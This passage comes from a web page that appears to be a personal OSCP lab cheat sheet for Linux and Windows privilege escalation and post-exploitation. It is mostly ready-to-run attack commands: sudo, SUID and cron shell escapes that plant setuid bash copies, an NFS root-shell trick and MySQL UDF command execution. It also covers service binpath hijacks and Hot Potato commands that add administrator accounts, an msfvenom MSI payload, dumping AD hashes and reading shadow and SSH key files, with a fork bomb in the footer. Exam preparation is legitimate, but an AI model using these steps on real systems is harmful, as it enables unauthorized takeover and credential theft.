<td>find . -name &quot;config.php&quot;get the credentialsmysql -u root -p aCs2009offsecuse mysql;select sys_exec(&quot;whoami&quot;);select sys_eval(&#39;whoami&#39;);</td>
<td><em>PHP and MySQL</em><a href="http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html" rel="nofollow"><em>http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html</em></a>**</td>
</tr>
<tr>
<td>1. Uname -a2. linux-exploit-suggester-2.pl -k  gcc  -o exploit -Wl,--hash-style=bothgcc -m32 -Wl,--hash-style=both</td>
<td><em>Kernel vulnerability. Don’t have to use exploit suggester exploitdb works just as well. This was rare in most instances, in the lab you do get some with vulnerable kernels. The secret is to compile them correct as shown with the gcc commands.</em></td>
</tr>
<tr>
<td>find / ! -path &quot;<em>/proc/</em>&quot; -perm -2 -type f -print 2&gt;/dev/null</td>
<td><em>World writable files.</em></td>
</tr>
<tr>
<td>find / -perm -u=s -type f 2&gt;/dev/null find / -perm -4000 -type f 2&gt;/dev/null</td>
<td><em>Suid misconfiguration.</em> <strong><em>Example programs:</em></strong> <em>nmap vim nano</em> <em>Binary with suid permission can be run by anyone, but when they are run they are run as root!</em> <em>Nmap example</em> <strong><em>Nmap: $ nmap --interactive</em> <em>nmap&gt; !sh</em></strong><em><a href="https://www.pentestpartners.com/security-blog/exploiting-suid-executables/" rel="nofollow">https://www.pentestpartners.com/security-blog/exploiting-suid-executables/</a></em></td>
</tr>
<tr>
<td>1. cat ~/.bash_history 2. cd ~ 3. grep -Eir &quot;password</td>
<td>secret</td>
</tr>
<tr>
<td>sudo -l sudo find /bin -name nano -exec /bin/sh \;  sudo awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;  echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; shell.nse &amp;&amp; sudo nmap --script=shell.nse sudo vim -c &#39;!sh&#39;</td>
<td><em>Sudo shell escapes.</em>*<em>1. *Notice the list of programs that can run via sudo</em> 2. <em>Loof for any of these:</em>      - <em>find</em>     - <em>awk</em>     - <em>nmap</em>     - <em>vim</em> <em>If you have any of those proceed to exploit.</em></td>
</tr>
<tr>
<td>1. cat /etc/exports 2. If “no_root_squash” option is defined for the “/tmp” export (or another export), use this method Exploitation  Kali VM  1. Open command prompt and type: showmount -e [Linux VM IP Address]  2. In command prompt type: mkdir /tmp/1  3. In command prompt type: <strong>mount -o rw,vers=2 [Linux VM IP Address]:/tmp /tmp/1</strong>  In command prompt type: <strong>echo &#39;int main() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; }&#39; &gt; /tmp/1/x.c</strong>  4. In command prompt type: <strong>gcc /tmp/1/x.c -o /tmp/1/x</strong>  5. In command prompt type: <strong>chmod +s /tmp/1/x</strong>  Linux VM  1. In command prompt type: <strong>/tmp/x</strong>  2. In command prompt type: <strong>id</strong></td>
<td><em>Exploit misconfigured vulnerable NFS.</em><a href="http://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/" rel="nofollow"><em>http://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/</em></a></td>
</tr>
<tr>
<td>s -aRl /etc/cron*</td>
<td>awk &#39;$1 ~ /w.$/&#39; 2&gt;/dev/null cron.d cron.daily cron.deny cron.hourly cron.monthly cron.weekly crontab  Linux VM  1. In command prompt type: cat /etc/crontab  2. From the output, notice the value of the “PATH” variable Exploitation  Linux VM  1. In command prompt type: <strong>echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt; /home/user/overwrite.sh</strong>  2. In command prompt type: <strong>chmod +x /home/user/overwrite.sh</strong>  3. Wait 1 minute for the Bash script to execute.  4. In command prompt type: <strong>/tmp/bash -p</strong>  5. In command prompt type: <strong>id</strong></td>
</tr>
<tr>
<td>Linux VM  1. In command prompt type: <strong>cat /etc/crontab</strong> 2. From the output, notice the script “/usr/local/bin/compress.sh”  3. In command prompt type: <strong>cat /usr/local/bin/compress.sh</strong> 4. From the output, notice the wildcard (<em>) used by ‘tar’. Add checkpoint variables to tar: 1. **echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt; /home/user/runme.sh</em>* 2. <strong>touch /home/user/--checkpoint=1</strong> 3. <strong>touch /home/user/--checkpoint-action=exec=sh\ runme.sh</strong> 4. Wait for script to execute 5. <strong>/tmp/bash -p</strong> 6. <strong>id</strong></td>
<td><em>Cron ( Tar wildcard)</em> <em>Use this if /etc/crontab has a tar command (or other command that has a wildcard)</em></td>
</tr>
<tr>
<td>1. <strong>echo &#39;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#39; &gt;&gt; /usr/local/bin/overwrite.sh</strong> 2. Wait for script to execute 3. <strong>/tmp/bash -p</strong> 4. <strong>id</strong></td>
<td><em>Cron (file overwrite)</em> <em>Use this if /etc/crontab has a file that you have write permission to</em></td>
</tr>
<tr>
<td>dpkg -l</td>
<td>grep -i exim ( is version is below 4.86.2 ?) Is exim compiled with perl support? exim -bV -v</td>
</tr>
<tr>
<td>uname -a env id cat /proc/version cat /etc/issue cat /etc/passwd cat /etc/group cat /etc/shadow cat /etc/hosts grep -vE &quot;nologin&quot; /etc/passwd</td>
<td><em>Some manual enumeration within files.</em></td>
</tr>
<tr>
<td># Debian dpkg -l  # CentOS, OpenSuse, Fedora, RHEL rpm -qa (CentOS / openSUSE )  # OpenBSD, FreeBSD pkg_info</td>
<td><em>Check vulnerable software.</em><em>Use searchsploit or exploitdb. Sometimes github has an exploit as well.</em></td>
</tr>
<tr>
<td>h<a href="http://www.dankalia.com/tutor/01005/0100501004.htm" rel="nofollow">ttp://www.dankalia.com/tutor/01005/0100501004.htm</a></td>
<td><em>Is there a punctuation ‘.’ mark in the PATH.</em></td>
</tr>
<tr>
<td>Check all home directories .ssh folders ls -la ~/.ssh/ find / -name &quot;id_dsa*&quot; -o -name &quot;id_rsa*&quot; -o -name &quot;known_hosts&quot; -o -name &quot;authorized_hosts&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null</td>
<td>xargs -rls -la</td>
</tr>
<tr>
<td>ps aux</td>
<td>grep root  ps aux</td>
</tr>
<tr>
<td><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html" rel="nofollow">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html</a><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" rel="nofollow">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></td>
<td><em>I followed these guides when it failed.</em></td>
</tr>
</tbody></table>

<h2>Windows</h2>

<table><thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
<td><a href="https://github.com/LennonCMJ/pentest_script/blob/master/WindowsPE.md" rel="nofollow">https://github.com/LennonCMJ/pentest_script/blob/master/WindowsPE.md</a></td>
<td><em>Run the famous JollyKatz enumeration script. Work through the results. I prefer this as it’s not as much of a information overload as the other enumeration scripts.</em></td>
</tr>
<tr>
<td><a href="http://rynudus.blogspot.com/2011/10/sql-ninja.html" rel="nofollow">http://rynudus.blogspot.com/2011/10/sql-ninja.html</a></td>
<td><em>Does it run SQL?</em></td>
</tr>
<tr>
<td>tasklist /fi &quot;USERNAME ne NT AUTHORITY\SYSTEM&quot; /fi &quot;STATUS eq running&quot;</td>
<td><em>Any services running as SYSTEM?</em></td>
</tr>
<tr>
<td>$username = &#39;user&#39; $password = &#39;password&#39; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword Start-Process **** -Credential $credential</td>
<td><em>Powershell script to run-as</em></td>
</tr>
<tr>
<td>[\REMOTE_HOST\SYSVOL\REMOTE_HOST\Policies{POLICY_ID}\Machine\Preferences](file://remote_host/SYSVOL/REMOTE_HOST/Policies/%7BPOLICY_ID%7D/Machine/Preferences/) The following configuration files may be present: - Services\Services.xml - ScheduledTasks\ScheduledTasks.xml - Printers\Printers.xml - Drives\Drives.xml - DataSources\DataSources.xml</td>
<td><em>If Windows &gt; 2008 check the Group Policy Preferences.</em><strong><a href="https://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html" rel="nofollow"><em>https://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html</em></a>  </strong></td>
</tr>
<tr>
<td>Potato.exe -ip 127.0.0.1 -cmd &quot;net user tater Winter2016 /add &amp;&amp; net localgroup administrators tater /add&quot; -disable_exhaust true</td>
<td><em>Check if the hot potato exploit can be used.</em><strong><em><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075" rel="nofollow">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></em></strong><em><a href="https://github.com/breenmachine/RottenPotatoNG" rel="nofollow">https://github.com/breenmachine/RottenPotatoNG</a></em></td>
</tr>
<tr>
<td>wmic service get name,displayname,pathname,startmode</td>
<td>findstr /i &quot;Auto&quot;</td>
</tr>
<tr>
<td><strong>Check:</strong>accesschk.exe -uwcqv  &quot;Authenticated Users&quot; c:*  /accepteula accesschk.exe -qwsu &quot;Authenticated Users&quot; c:*sc qc <strong>Exploit:</strong>sc config upnphost  binpath= &quot;net localgroup Administrators backdoora /add&quot; depend= &quot;&quot; sc config upnphost  obj= &quot;.\LocalSystem&quot; password= &quot;&quot;  binpath= &quot;net localgroup Administrators backdoora /add&quot; sc config upnphost  obj= &quot;.\LocalSystem&quot; password= &quot;&quot;</td>
<td><em>Check to exploit vulnerable services. Accesscheck will determine which service bin paths can be modified.</em><strong><em>Then we can use</em> ***sc qc</strong>* <em>to determine the properties, you want to look for the following listed below.</em><strong><em>Look for:</em></strong><strong>- <em>SERVICE_CHANGE_CONFIG</em> - <em>SERVICE_ALL_ACCESS</em> - <em>GENERIC_WRITE</em> - <em>GENERIC_ALL</em> - <em>WRITE_DAC</em> - <em>WRITE_OWNER</em> </strong>**<strong><a href="https://www.gracefulsecurity.com/privesc-insecure-service-permissions/" rel="nofollow"><em>https://www.gracefulsecurity.com/privesc-insecure-service-permissions/</em></a> </strong><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-windows-services-all-roads-lead-to-system-whitepaper.pdf" rel="nofollow"><em>https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-windows-services-all-roads-lead-to-system-whitepaper.pdf</em></a>**</td>
</tr>
<tr>
<td>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedmsfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msimsiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi</td>
<td><em>Is always elevated installations enabled on the server? We can exploit that.</em><strong><em>First check the registry, both must be set to 1.</em></strong><em>Use MSFvenom to create msi exploit.</em></td>
</tr>
<tr>
<td>for %a in (&quot;%path:;=&quot;;&quot;%&quot;) do accesschk.exe  /accepteula -dqv &quot;%~a&quot;</td>
<td><em>%PATH% exploit.</em></td>
</tr>
<tr>
<td>/ What system are we connected to? systeminfo</td>
<td>findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; // Get the hostname and username (if available) hostname echo %username% // Get users net users net user [username] // Networking stuff ipconfig /all // Printer? route print // ARP-arific arp -A // Active network connections netstat -ano // Firewall fun (Win XP SP2+ only) netsh firewall show state netsh firewall show config // Scheduled tasks schtasks /query /fo LIST /v // Running processes to started services tasklist /SVC net start // Driver madness DRIVERQUERY // WMIC fun (Win 7/8 -- XP requires admin) wmic /? # Use wmic_info script! // WMIC: check patch level wmic qfe get Caption,Description,HotFixID,InstalledOn // Search pathces for given patch wmic qfe get Caption,Description,HotFixID,InstalledOn</td>
</tr>
<tr>
<td><a href="http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation" rel="nofollow">http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation</a> <a href="https://github.com/AusJock/Privilege-Escalation/tree/master/Windows" rel="nofollow">https://github.com/AusJock/Privilege-Escalation/tree/master/Windows</a> <a href="https://github.com/abatchy17/WindowsExploits" rel="nofollow">https://github.com/abatchy17/WindowsExploits</a></td>
<td><em>Pre-compiled windows exploits.</em></td>
</tr>
<tr>
<td><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html" rel="nofollow">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</a> <a href="http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html" rel="nofollow">http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html</a>  <a href="https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/" rel="nofollow">https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></td>
<td><em>Some brilliant resources if the above fails.</em></td>
</tr>
</tbody></table>

<h2>Dump</h2>

<p>Use this to dump all the results for your priv escalation.</p>

<h2>Local</h2>

<p>Document the steps used to escalate to local access. Most instances you will be escalating to Root/Admin and not another local user.</p>

<h2>Root/Admin</h2>

<p>Document the steps used to escalate to root access. For exploits make use of the exploit template.</p>

<h1>Flags</h1>

<p>[ ] Proof.txt<br>
[ ] ifconfig/ipconfig<br>
[ ] whoami/id</p>

<p>The below commands will list all .txt files to identify the flags. Used in several CTFs and useful for the OSCP challenge.</p>

<table><thead>
<tr>
<th><strong>Windows</strong></th>
<th><strong>Linux</strong></th>
</tr>
</thead><tbody>
<tr>
<td>(for /R &quot;.\&quot; %A in (*.txt) do echo %~fA %~zA)</td>
<td>findstr /v &quot;echo</td>
</tr>
</tbody></table>

<p>Each local.txt and proof.txt found must be shown in a screenshot that includes the contents of the file, as well as the IP address of the target by using ipconfig or ifconfig. An example of this is shown below:</p>

<p><img src="https://d2mxuefqeaa7sj.cloudfront.net/s_FDD3C735FA610D24B03CD0A8B8D0A0BAAF548D7894BF830E1750DF6CA9779F4B_1548138208579_file.png" alt=""></p>

<h2>Proof</h2>

<p>Paste your proof here.</p>

<h1>Post Exploitation</h1>

<p>Use this for the labs. Note that the machines in the exam is not connected and I could only advise to spend more time on enumeration and exploitation than post exploitation.</p>

<h2>Linux</h2>

<table><thead>
<tr>
<th><strong>File</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
<td>/etc/resolv.conf</td>
<td>Contains the current name servers (DNS) for the system. This is a globally readable file that is less likely to trigger IDS alerts than /etc/passwd</td>
</tr>
<tr>
<td>/etc/motd</td>
<td>Message of the Day.</td>
</tr>
<tr>
<td>/etc/issue</td>
<td>Debian - current version of distro</td>
</tr>
<tr>
<td>/etc/passwd</td>
<td>List of local users</td>
</tr>
<tr>
<td>/etc/shadow</td>
<td>List of users’ passwords’ hashes (requires root)</td>
</tr>
<tr>
<td>~/.bash_history[d]</td>
<td>Will give you some directory context</td>
</tr>
<tr>
<td>~/.mysql_history</td>
<td>MySQL database history - could have passwords</td>
</tr>
</tbody></table>

<h2>Windows</h2>

<table><thead>
<tr>
<th><strong>File</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead><tbody>
<tr>
<td>net user username password /ADD net localgroup Administrators username /ADD</td>
<td>Add yourself as administrator.</td>
</tr>
<tr>
<td>impacket-secretsdump -system &#39;root/Documents/OSCP/10.11.X.XXX/system.save&#39; -ntds &#39;/root/Documents/OSCP/10.11.X.XXX/ntds.dit&#39; LOCAL</td>
<td>Dump the active directory.</td>
</tr>
<tr>
<td>netsh firewall add portopening TCP 455 &quot;Service Firewall&quot; ENABLE ALL</td>
<td>Enable specific firewall ports.</td>
</tr>
<tr>
<td>- Arp -a  - netstat -abno - ipconfig /all - route print - schtasks /query /fo LIST /v - netsh firewall show config</td>
<td>Look for any connections to other hosts in the lab. Here you have a pivoting opportunity.</td>
</tr>
<tr>
<td>(for /R &quot;.\&quot; %A in (*.txt) do echo %~fA %~zA)</td>
<td>findstr /v &quot;echo</td>
</tr>
<tr>
<td>Net shares</td>
<td>Look at file shares.</td>
</tr>
<tr>
<td>Get-ADComputer -Filter * -Properties *</td>
<td>Select-Object @{Label = &quot;Computer Name&quot;;Expression = {$<em>.Name}},@{Label = &quot;Last Logon Date&quot;;Expression = {$</em>.LastLogonDate}} Get-ADUser -Filter * -Properties *</td>
</tr>
<tr>
<td><a href="http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-post-exploitation.html" rel="nofollow">http://hackingandsecurity.blogspot.com/2017/09/oscp-windows-post-exploitation.html</a></td>
<td>Windows guide for post exploitation.</td>
</tr>
</tbody></table>

    </main>
    </main>
    <footer id="footer">
        <div class="footer-section">Copyright © 2019 - 2020 ovelny</div>
      <div class="footer-section">:(){ :|:& };:</div>
    </footer>
  </body>
</html>

